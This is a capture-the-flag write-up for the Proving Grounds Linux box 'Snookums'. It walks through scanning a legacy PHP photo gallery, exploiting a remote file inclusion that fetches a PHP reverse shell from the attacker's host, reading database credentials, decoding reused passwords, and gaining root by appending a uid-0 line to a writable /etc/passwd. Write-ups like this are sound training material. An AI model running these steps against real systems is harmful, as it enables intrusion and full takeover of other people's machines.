---
machine: Snookums
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [rfi, photo-gallery, credential-reuse, writable-etc-passwd]
date: 2026-07-22
status: retired
summary: A CentOS box running a legacy PHP photo gallery — testing a remote-file-inclusion vulnerability for a webshell foothold, database credentials that unlock a doubly-base64-encoded password reused by a second user, and a writable `/etc/passwd` file for direct root escalation.
---

## Enumeration

nmap scan:

```bash
──(kali㉿kali)-[192.168.45.225]-[~]
└─$ nmap-full 192.168.204.58
[*] Running fast port discovery on 192.168.204.58...
[*] Open ports: 21,22,80,111,139,445,3306,33060
[*] Running full scan on 192.168.204.58...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-22 15:14 -0400
Nmap scan report for 192.168.204.58
Host is up (0.034s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Simple PHP Photo Gallery
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2026-07-22T15:14:37-04:00
| smb2-time: 
|   date: 2026-07-22T19:14:35
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m03s, deviation: 2h18m36s, median: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.12 seconds

```

We have a few interesting listings: anonymous login FTP server, a webapp with `http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16`, rpcbind with some connections (perhaps enum4linux may find some enumeration info?), a samba share, a mysql database on port 3306

We first navigate to the webapp. It has a banner called "Simple PHP Photo Gallery" with several images. We also see its run by "Simple PHP Photo Gallery v0.8". Upon looking it up we find it may be vulnerable to an LFI: https://www.exploit-db.com/exploits/7786

We next feroxbust this website:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~]
└─$ feroxbuster -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
                                                                                                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target/
 🚩  In-Scope Url          │ target
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        8l       22w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       20w      229c http://target/images => http://target/images/
200      GET      171l      394w     3535c http://target/css/lightbox.css
200      GET      351l      915w    11597c http://target/js/lightbox.js
200      GET       76l      455w    35440c http://target/images/examples/thumb-5.jpg
200      GET       73l      472w    35302c http://target/images/examples/thumb-4.jpg
200      GET        4l     1236w    94839c http://target/js/jquery-1.7.2.min.js
200      GET      417l     2010w   169815c http://target/images/examples/image-6.jpg
200      GET      457l     2618w   245309c http://target/images/examples/image-2.jpg
200      GET      432l     2300w   198123c http://target/images/examples/image-1.jpg
200      GET      428l     2705w   287473c http://target/images/examples/image-4.jpg
200      GET       71l      120w     1508c http://target/image.php
301      GET        7l       20w      229c http://target/photos => http://target/photos/
301      GET        7l       20w      226c http://target/css => http://target/css/
200      GET      215l      564w     4516c http://target/css/screen.css
200      GET        0l        0w        0c http://target/db.php
200      GET       90l      182w     2730c http://target/index.php
200      GET       20l       71w     2798c http://target/js/jquery.smooth-scroll.min.js
200      GET       48l      265w    20142c http://target/images/examples/thumb-6.jpg
200      GET        3l       37w      986c http://target/images/bg-checker.png
200      GET       63l      389w    27990c http://target/images/examples/thumb-1.jpg
200      GET      103l      511w    13348c http://target/images/loading.gif
200      GET       72l      552w    41964c http://target/images/examples/thumb-3.jpg
200      GET       78l      450w    38308c http://target/images/examples/thumb-2.jpg
200      GET       50l      341w    20823c http://target/js/jquery-ui-1.8.18.custom.min.js
301      GET        7l       20w      225c http://target/js => http://target/js/
200      GET      363l     2264w   215577c http://target/images/examples/image-3.jpg
200      GET      375l     2584w   242856c http://target/images/examples/image-5.jpg
200      GET       90l      182w     2730c http://target/
200      GET        3l       11w      873c http://target/images/close.png
200      GET        4l       39w     1504c http://target/images/favicon.gif
200      GET        1l        1w       59c http://target/images/bullet.gif
200      GET       12l      100w     5700c http://target/images/speech-bubbles.png
200      GET        8l       38w     2452c http://target/images/prev.png
200      GET       11l       43w     2409c http://target/images/next.png
200      GET       15l      133w     8439c http://target/images/donate.png
200      GET       51l      327w    20329c http://target/images/box.png
404      GET        7l       25w      203c http://target/%20.php
200      GET        0l        0w        0c http://target/functions.php
```

This shows a few entries we may want to look deeper into:
- `http://target/functions.php`
- `http://target/db.php`

Both present a blank page when navigated to.

We read the previously listed LFI vulnerability and begin to attempt it:
`http://target/index.php?preview=prev.png%00` successfully shows a page meaning we can try to inject our local file containing a path traversal before the null byte where prev.png normally rests.

## Foothold

I couldn't get this to work so I looked at some older exploits:
This is an RFI vulnerability https://www.exploit-db.com/exploits/48424. I find this works by listening on port 80 and trying to traverse to it via `http://target/image.php?img=http://192.168.45.225`

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/snookums]
└─$ penelope -p 80
[+] Listening for reverse shells on 0.0.0.0:80 -> 127.0.0.1 • 10.0.2.15 • 172.18.0.1 • 172.19.0.1 • 172.21.0.1 • 172.20.0.1 • 172.17.0.1 • 192.168.45.225
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[-] Invalid shell from 192.168.204.58 🙄
[-] Invalid shell from 192.168.45.225 🙄
[!] Stopping TCPListener(0.0.0.0:80)
```

This shows the RFI is working and now I just need a PHP shell which will work with it.

I attempt to establish a revshell with the ivan.php php revshell but it doesn't work.

Next I try the PHP Monkey revshell at the same endpoint: `http://target/image.php?img=http://192.168.45.225:9999/monkey.php`

After a few minutes I see it retrieves it from my python webserver, however, it never hits my 4444 listener:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/snookums]
└─$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
192.168.45.225 - - [22/Jul/2026 16:13:11] "GET /monkey.php HTTP/1.1" 200 -
```

If I swap my server to port 80, we get a shell:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/snookums]
└─$ sudo rlwrap -cAr nc -lvnp 445
[sudo] password for kali: 
listening on [any] 445 ...
connect to [192.168.45.225] from (UNKNOWN) [192.168.204.58] 50910
Linux snookums 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:34:38 up  2:30,  0 users,  load average: 0.00, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```

At this point we need to get to our user michael, upon doing some research I found you can enumerate some interesting php components with the LFI/RFI we have access to in the webapp with the following commands:
`php://filter/convert.base64-encode/resource=index.php>`

This poses as essentially an arbitrary php read from the relative path which we could use to read index.php.

However, as we have a shell on the system we can manually investigate the websites relative path of `/var/www/html`

```bash
bash-4.2$ cd /var/www/html
cd /var/www/html
bash-4.2$ ls
ls
README.txt
UpgradeInstructions.txt
css
db.php
embeddedGallery.php
functions.php
image.php
images
index.php
js
license.txt
photos
phpGalleryConfig.php
phpGalleryStyle-RED.css
phpGalleryStyle.css
phpGallery_images
phpGallery_thumbs
thumbnail_generator.php
```

We see `db.php` which shows us:

```php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
```

We attempt to connect to the database from our server using these creds but are met with the following error:

```bash
──(kali㉿kali)-[192.168.45.225]-[~/oscp/snookums]
└─$ mysql -u root -p'MalapropDoffUtilize1337' -h 192.168.204.58 -P 3306 --skip-ssl-verify-server-cert
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.225' is not allowed to connect to this MySQL server
```

However, when we try to access it from the apache user on the box, we get access:

```bash
bash-4.2$ mysql -u root -p'MalapropDoffUtilize1337' -h 127.0.0.1 -P 3306                              
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.20 MySQL Community Server - GPL

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| SimplePHPGal       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> show tables from SimplePHPGal;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from SimplePHPGal.users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.01 sec)

mysql> 
```

These passwords seem to be in base64, this could potentially be the password we need to `su` into michael.

One round doesnt seem to do the trick so we pipe it through `base64 -d` twice:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/snookums]
└─$ echo -n 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d  
SG9ja1N5ZG5leUNlcnRpZnkxMjM=                                                                                                                                                                                       ┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/snookums]
└─$ echo -n 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d | base64 -d 
HockSydneyCertify123  
```

Lets attempt `michael:HockSydneyCertify123`

This credpair works and gives us access to michael. We can gather the flag from his home directory and start hunting privesc:

```bash
bash-4.2$ su michael
Password: 
[michael@snookums /]$ whoami
michael
```

## Privilege Escalation

Upon searching through files I can write to as michael, I find I can write to `/etc/passwd`

```bash
[michael@snookums ~]$ find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys # writable files
/etc/passwd
/var/spool/mail/michael
/tmp/linpeas.sh
/home/michael/.bash_logout
/home/michael/.bash_profile
/home/michael/.bashrc
/home/michael/local.txt
```

This means I can add an entry for a user, password, and permission set as discussed about in the PWK [[Linux Privilege Escalation]] module:

```bash
[michael@snookums ~]$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
[michael@snookums ~]$ su root2
Password: 
[root@snookums michael]# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
```

Finally we can get the flag from `/root/proof.txt` and the box is solved!
